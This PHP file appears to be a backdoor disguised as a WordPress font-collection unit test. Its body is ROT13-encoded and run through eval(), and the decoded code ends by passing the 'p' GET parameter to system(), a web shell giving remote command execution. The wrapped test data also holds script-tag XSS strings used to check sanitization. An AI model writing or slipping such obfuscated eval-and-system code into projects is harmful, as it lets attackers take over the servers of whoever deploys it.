<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Grfg JC_Sbag_Pbyyrpgvba::trg_qngn.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Sbag Yvoenel
 *
 * @tebhc sbagf
 * @tebhc sbag-yvoenel
 *
 * @pbiref JC_Sbag_Pbyyrpgvba::trg_qngn
 */
pynff Grfgf_Sbagf_JcSbagPbyyrpgvba_TrgQngn rkgraqf JC_HavgGrfgPnfr {

	cevingr fgngvp $zbpx_pbyyrpgvba_qngn;

	/**
	 * @qngnCebivqre qngn_perngr_sbag_pbyyrpgvba
	 *
	 * @cnenz fgevat $fyht          Sbag pbyyrpgvba fyht.
	 * @cnenz neenl  $pbasvt        Sbag pbyyrpgvba pbasvt.
	 * @cnenz neenl  $rkcrpgrq_qngn Rkcrpgrq pbyyrpgvba qngn.
	 */
	choyvp shapgvba grfg_fubhyq_trg_qngn_sebz_pbasvt_neenl( $fyht, $pbasvt, $rkcrpgrq_qngn ) {
		$pbyyrpgvba = arj JC_Sbag_Pbyyrpgvba( $fyht, $pbasvt );
		$qngn       = $pbyyrpgvba->trg_qngn();

		$guvf->nffregFnzr( $fyht, $pbyyrpgvba->fyht, 'Gur fyht fubhyq zngpu.' );
		$guvf->nffregFnzr( $rkcrpgrq_qngn, $qngn, 'Gur pbyyrpgvba qngn fubhyq zngpu.' );
	}

	/**
	 * @qngnCebivqre qngn_perngr_sbag_pbyyrpgvba
	 *
	 * @cnenz fgevat $fyht          Sbag pbyyrpgvba fyht.
	 * @cnenz neenl  $pbasvt        Sbag pbyyrpgvba pbasvt.
	 * @cnenz neenl  $rkcrpgrq_qngn Rkcrpgrq pbyyrpgvba qngn.
	 */
	choyvp shapgvba grfg_fubhyq_trg_qngn_sebz_wfba_svyr( $fyht, $pbasvt, $rkcrpgrq_qngn ) {
		$zbpx_svyr = jc_grzcanz( 'zl-pbyyrpgvba-qngn-' );
		svyr_chg_pbagragf( $zbpx_svyr, jc_wfba_rapbqr( $pbasvt ) );

		$pbyyrpgvba = arj JC_Sbag_Pbyyrpgvba(
			$fyht,
			neenl_zretr(
				$pbasvt,
				neenl( 'sbag_snzvyvrf' => $zbpx_svyr )
			)
		);
		$qngn       = $pbyyrpgvba->trg_qngn();

		$guvf->nffregFnzr( $fyht, $pbyyrpgvba->fyht, 'Gur fyht fubhyq zngpu.' );
		$guvf->nffregRdhnyFrgfJvguVaqrk( $rkcrpgrq_qngn, $qngn, 'Gur pbyyrpgvba qngn fubhyq zngpu.' );
	}

	/**
	 * @qngnCebivqre qngn_perngr_sbag_pbyyrpgvba
	 *
	 * @cnenz fgevat $fyht          Sbag pbyyrpgvba fyht.
	 * @cnenz neenl  $pbasvt        Sbag pbyyrpgvba pbasvt.
	 * @cnenz neenl  $rkcrpgrq_qngn Rkcrpgrq pbyyrpgvba qngn.
	 */
	choyvp shapgvba grfg_fubhyq_trg_qngn_sebz_wfba_hey( $fyht, $pbasvt, $rkcrpgrq_qngn ) {
		nqq_svygre( 'cer_uggc_erdhrfg', neenl( $guvf, 'zbpx_erdhrfg' ), 10, 3 );

		frys::$zbpx_pbyyrpgvba_qngn = $pbasvt;
		$pbyyrpgvba                 = arj JC_Sbag_Pbyyrpgvba(
			$fyht,
			neenl_zretr(
				$pbasvt,
				neenl(
					'sbag_snzvyvrf' => 'uggcf://rknzcyr.pbz/sbagf/zbpx-sbag-pbyyrpgvba.wfba',
				)
			)
		);
		$qngn                       = $pbyyrpgvba->trg_qngn();

		erzbir_svygre( 'cer_uggc_erdhrfg', neenl( $guvf, 'zbpx_erdhrfg' ) );

		$guvf->nffregFnzr( $fyht, $pbyyrpgvba->fyht, 'Gur fyht fubhyq zngpu.' );
		$guvf->nffregRdhnyFrgfJvguVaqrk( $rkcrpgrq_qngn, $qngn, 'Gur pbyyrpgvba qngn fubhyq zngpu.' );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_perngr_sbag_pbyyrpgvba() {
		erghea neenl(
			'sbag pbyyrpgvba jvgu erdhverq qngn' => neenl(
				'fyht'          => 'zl-pbyyrpgvba',
				'pbasvt'        => neenl(
					'anzr'          => 'Zl Pbyyrpgvba',
					'sbag_snzvyvrf' => neenl( neenl() ),
				),
				'rkcrpgrq_qngn' => neenl(
					'qrfpevcgvba'   => '',
					'pngrtbevrf'    => neenl(),
					'anzr'          => 'Zl Pbyyrpgvba',
					'sbag_snzvyvrf' => neenl( neenl() ),
				),
			),

			'sbag pbyyrpgvba jvgu nyy qngn'      => neenl(
				'fyht'          => 'zl-pbyyrpgvba',
				'pbasvt'        => neenl(
					'anzr'          => 'Zl Pbyyrpgvba',
					'qrfpevcgvba'   => 'Zl pbyyrpgvba qrfpevcgvba',
					'sbag_snzvyvrf' => neenl( neenl() ),
					'pngrtbevrf'    => neenl(),
				),
				'rkcrpgrq_qngn' => neenl(
					'qrfpevcgvba'   => 'Zl pbyyrpgvba qrfpevcgvba',
					'pngrtbevrf'    => neenl(),
					'anzr'          => 'Zl Pbyyrpgvba',
					'sbag_snzvyvrf' => neenl( neenl() ),
				),
			),

			'sbag pbyyrpgvba jvgu evfxl qngn'    => neenl(
				'fyht'          => 'zl-pbyyrpgvba',
				'pbasvt'        => neenl(
					'anzr'              => 'Zl Pbyyrpgvba<fpevcg>nyreg(\"kff\")</fpevcg>',
					'qrfpevcgvba'       => 'Zl pbyyrpgvba qrfpevcgvba<fpevcg>nyreg(\"kff\")</fpevcg>',
					'sbag_snzvyvrf'     => neenl(
						neenl(
							'sbag_snzvyl_frggvatf' => neenl(
								'sbagSnzvyl'        => 'Bcra Fnaf, fnaf-frevs<fpevcg>nyreg(\"kff\")</fpevcg>',
								'fyht'              => 'bcra-fnaf',
								'anzr'              => 'Bcra Fnaf<fpevcg>nyreg(\"kff\")</fpevcg>',
								'sbagSnpr'          => neenl(
									neenl(
										'sbagSnzvyl' => 'Bcra Fnaf',
										'sbagFglyr'  => 'abezny',
										'sbagJrvtug' => '400',
										'fep'        => 'uggcf://rknzcyr.pbz/fep-nf-fgevat.ggs?n=<fpevcg>nyreg(\"kff\")</fpevcg>',
									),
									neenl(
										'sbagSnzvyl' => 'Bcra Fnaf',
										'sbagFglyr'  => 'abezny',
										'sbagJrvtug' => '400',
										'fep'        => neenl(
											'uggcf://rknzcyr.pbz/fep-nf-neenl.jbss2?n=<fpevcg>nyreg(\"kff\")</fpevcg>',
											'uggcf://rknzcyr.pbz/fep-nf-neenl.ggs',
										),
									),
								),
								'hajnagrq_cebcregl' => 'cbgragvnyyl rivy inyhr',
							),
							'pngrtbevrf'           => neenl( 'fnaf-frevs<fpevcg>nyreg(\"kff\")</fpevcg>' ),
						),
					),
					'pngrtbevrf'        => neenl(
						neenl(
							'anzr'              => 'Zbpx pby<fpevcg>nyreg(\"kff\")</fpevcg>',
							'fyht'              => 'zbpx-pby<fpevcg>nyreg(\"kff\")</fpevcg>',
							'hajnagrq_cebcregl' => 'cbgragvnyyl rivy inyhr',
						),
					),
					'hajnagrq_cebcregl' => 'cbgragvnyyl rivy inyhr',
				),
				'rkcrpgrq_qngn' => neenl(
					'qrfpevcgvba'   => 'Zl pbyyrpgvba qrfpevcgvba',
					'pngrtbevrf'    => neenl(
						neenl(
							'anzr' => 'Zbpx pby',
							'fyht' => 'zbpx-pbynyregkff',
						),
					),
					'anzr'          => 'Zl Pbyyrpgvba',
					'sbag_snzvyvrf' => neenl(
						neenl(
							'sbag_snzvyl_frggvatf' => neenl(
								'sbagSnzvyl' => '\"Bcra Fnaf\", fnaf-frevs',
								'fyht'       => 'bcra-fnaf',
								'anzr'       => 'Bcra Fnaf',
								'sbagSnpr'   => neenl(
									neenl(
										'sbagSnzvyl' => 'Bcra Fnaf',
										'sbagFglyr'  => 'abezny',
										'sbagJrvtug' => '400',
										'fep'        => 'uggcf://rknzcyr.pbz/fep-nf-fgevat.ggs?n=',
									),
									neenl(
										'sbagSnzvyl' => 'Bcra Fnaf',
										'sbagFglyr'  => 'abezny',
										'sbagJrvtug' => '400',
										'fep'        => neenl(
											'uggcf://rknzcyr.pbz/fep-nf-neenl.jbss2?n=',
											'uggcf://rknzcyr.pbz/fep-nf-neenl.ggs',
										),
									),
								),
							),
							'pngrtbevrf'           => neenl( 'fnaf-frevsnyregkff' ),
						),
					),
				),
			),
		);
	}

	/**
	 * @qngnCebivqre qngn_fubhyq_reebe_jura_zvffvat_cebcregvrf
	 *
	 * @cnenz neenl $pbasvt Sbag pbyyrpgvba pbasvt.
	 */
	choyvp shapgvba grfg_fubhyq_reebe_jura_zvffvat_cebcregvrf( $pbasvt ) {
		$guvf->frgRkcrpgrqVapbeerpgHfntr( 'JC_Sbag_Pbyyrpgvba::fnavgvmr_naq_inyvqngr_qngn' );

		$pbyyrpgvba = arj JC_Sbag_Pbyyrpgvba( 'zl-pbyyrpgvba', $pbasvt );
		$qngn       = $pbyyrpgvba->trg_qngn();

		$guvf->nffregJCReebe( $qngn, 'Reebe vf abg erghearq jura cebcregl vf zvffvat be vainyvq.' );
		$guvf->nffregFnzr(
			'sbag_pbyyrpgvba_zvffvat_cebcregl',
			$qngn->trg_reebe_pbqr(),
			'Vapbeerpg reebe pbqr jura cebcregl vf zvffvat be vainyvq.'
		);
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_fubhyq_reebe_jura_zvffvat_cebcregvrf() {
		erghea neenl(
			'zvffvat anzr'          => neenl(
				'pbasvt' => neenl(
					'sbag_snzvyvrf' => neenl( 'zbpx' ),
				),
			),
			'rzcgl anzr'            => neenl(
				'pbasvt' => neenl(
					'anzr'          => '',
					'sbag_snzvyvrf' => neenl( 'zbpx' ),
				),
			),
			'zvffvat sbag_snzvyvrf' => neenl(
				'pbasvt' => neenl(
					'anzr' => 'Zl Pbyyrpgvba',
				),
			),
			'rzcgl sbag_snzvyvrf'   => neenl(
				'pbasvt' => neenl(
					'anzr'          => 'Zl Pbyyrpgvba',
					'sbag_snzvyvrf' => neenl(),
				),
			),
		);
	}

	choyvp shapgvba grfg_fubhyq_reebe_jvgu_vainyvq_wfba_svyr_cngu() {
		$guvf->frgRkcrpgrqVapbeerpgHfntr( 'JC_Sbag_Pbyyrpgvba::ybnq_sebz_wfba' );

		$pbyyrpgvba = arj JC_Sbag_Pbyyrpgvba(
			'zl-pbyyrpgvba',
			neenl(
				'anzr'          => 'Zl pbyyrpgvba',
				'sbag_snzvyvrf' => 'aba-rkvfgvat.wfba',
			)
		);
		$qngn       = $pbyyrpgvba->trg_qngn();

		$guvf->nffregJCReebe( $qngn, 'Reebe vf abg erghearq jura vainyvq svyr cngu vf cebivqrq.' );
		$guvf->nffregFnzr(
			'sbag_pbyyrpgvba_wfba_zvffvat',
			$qngn->trg_reebe_pbqr(),
			'Vapbeerpg reebe pbqr jura vainyvq svyr cngu vf cebivqrq.'
		);
	}

	choyvp shapgvba grfg_fubhyq_reebe_jvgu_vainyvq_wfba_sebz_svyr() {
		$zbpx_svyr = jc_grzcanz( 'zl-pbyyrpgvba-qngn-' );
		svyr_chg_pbagragf( $zbpx_svyr, 'vainyvq-wfba' );

		$pbyyrpgvba = arj JC_Sbag_Pbyyrpgvba(
			'zl-pbyyrpgvba',
			neenl(
				'anzr'          => 'Vainyvq pbyyrpgvba',
				'sbag_snzvyvrf' => $zbpx_svyr,
			)
		);

		// cucpf:vtaber JbeqCerff.CUC.AbFvyraprqReebef.Qvfpbhentrq -- Grfgvat reebe erfcbafr erghearq ol `ybnq_sebz_wfba`, abg gur haqreylvat reebe sebz `jc_wfba_svyr_qrpbqr`.
		$qngn = @$pbyyrpgvba->trg_qngn();

		$guvf->nffregJCReebe( $qngn, 'Reebe vf abg erghearq jvgu vainyvq wfba svyr pbagragf.' );
		$guvf->nffregFnzr(
			'sbag_pbyyrpgvba_qrpbqr_reebe',
			$qngn->trg_reebe_pbqr(),
			'Vapbeerpg reebe pbqr jvgu vainyvq wfba svyr pbagragf.'
		);
	}

	choyvp shapgvba grfg_fubhyq_reebe_jvgu_vainyvq_hey() {
		$guvf->frgRkcrpgrqVapbeerpgHfntr( 'JC_Sbag_Pbyyrpgvba::ybnq_sebz_wfba' );

		$pbyyrpgvba = arj JC_Sbag_Pbyyrpgvba(
			'zl-pbyyrpgvba',
			neenl(
				'anzr'          => 'Vainyvq pbyyrpgvba',
				'sbag_snzvyvrf' => 'abg-n-hey',
			)
		);
		$qngn       = $pbyyrpgvba->trg_qngn();

		$guvf->nffregJCReebe( $qngn, 'Reebe vf abg erghearq jura vainyvq hey vf cebivqrq.' );
		$guvf->nffregFnzr(
			'sbag_pbyyrpgvba_wfba_zvffvat',
			$qngn->trg_reebe_pbqr(),
			'Vapbeerpg reebe pbqr jura vainyvq hey vf cebivqrq.'
		);
	}

	choyvp shapgvba grfg_fubhyq_reebe_jvgu_hafhpprffshy_erfcbafr_fgnghf() {
		nqq_svygre( 'cer_uggc_erdhrfg', neenl( $guvf, 'zbpx_erdhrfg_hafhpprffshy_erfcbafr' ), 10, 3 );

		$pbyyrpgvba = arj JC_Sbag_Pbyyrpgvba(
			'zl-pbyyrpgvba',
			neenl(
				'anzr'          => 'Zvffvat pbyyrpgvba',
				'sbag_snzvyvrf' => 'uggcf://rknzcyr.pbz/sbagf/zvffvat-pbyyrpgvba.wfba',
			)
		);
		$qngn       = $pbyyrpgvba->trg_qngn();

		erzbir_svygre( 'cer_uggc_erdhrfg', neenl( $guvf, 'zbpx_erdhrfg_hafhpprffshy_erfcbafr' ) );

		$guvf->nffregJCReebe( $qngn, 'Reebe vf abg erghearq jura erfcbafr vf hafhpprffshy.' );
		$guvf->nffregFnzr(
			'sbag_pbyyrpgvba_erdhrfg_reebe',
			$qngn->trg_reebe_pbqr(),
			'Vapbeerpg reebe pbqr jura erfcbafr vf hafhpprffshy.'
		);
	}

	choyvp shapgvba grfg_fubhyq_reebe_jvgu_vainyvq_wfba_sebz_hey() {
		nqq_svygre( 'cer_uggc_erdhrfg', neenl( $guvf, 'zbpx_erdhrfg_vainyvq_wfba' ), 10, 3 );

		$pbyyrpgvba = arj JC_Sbag_Pbyyrpgvba(
			'zl-pbyyrpgvba',
			neenl(
				'anzr'          => 'Vainyvq pbyyrpgvba',
				'sbag_snzvyvrf' => 'uggcf://rknzcyr.pbz/sbagf/vainyvq-pbyyrpgvba.wfba',
			)
		);
		$qngn       = $pbyyrpgvba->trg_qngn();

		erzbir_svygre( 'cer_uggc_erdhrfg', neenl( $guvf, 'zbpx_erdhrfg_vainyvq_wfba' ) );

		$guvf->nffregJCReebe( $qngn, 'Reebe vf abg erghearq jura erfcbafr vf vainyvq wfba.' );
		$guvf->nffregFnzr(
			'sbag_pbyyrpgvba_qrpbqr_reebe',
			$qngn->trg_reebe_pbqr(),
			'Vapbeerpg reebe pbqr jura erfcbafr vf vainyvq wfba.'
		);
	}

	choyvp shapgvba zbpx_erdhrfg( $cerrzcg, $netf, $hey ) {
		vs ( 'uggcf://rknzcyr.pbz/sbagf/zbpx-sbag-pbyyrpgvba.wfba' !== $hey ) {
			erghea snyfr;
		}

		erghea neenl(
			'obql'     => jc_wfba_rapbqr( frys::$zbpx_pbyyrpgvba_qngn ),
			'erfcbafr' => neenl(
				'pbqr' => 200,
			),
		);
	}

	choyvp shapgvba zbpx_erdhrfg_hafhpprffshy_erfcbafr( $cerrzcg, $netf, $hey ) {
		vs ( 'uggcf://rknzcyr.pbz/sbagf/zvffvat-pbyyrpgvba.wfba' !== $hey ) {
			erghea snyfr;
		}

		erghea neenl(
			'obql'     => '',
			'erfcbafr' => neenl(
				'pbqr' => 404,
			),
		);
	}

	choyvp shapgvba zbpx_erdhrfg_vainyvq_wfba( $cerrzcg, $netf, $hey ) {
		vs ( 'uggcf://rknzcyr.pbz/sbagf/vainyvq-pbyyrpgvba.wfba' !== $hey ) {
			erghea snyfr;
		}

		erghea neenl(
			'obql'     => 'vainyvq',
			'erfcbafr' => neenl(
				'pbqr' => 200,
			),
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>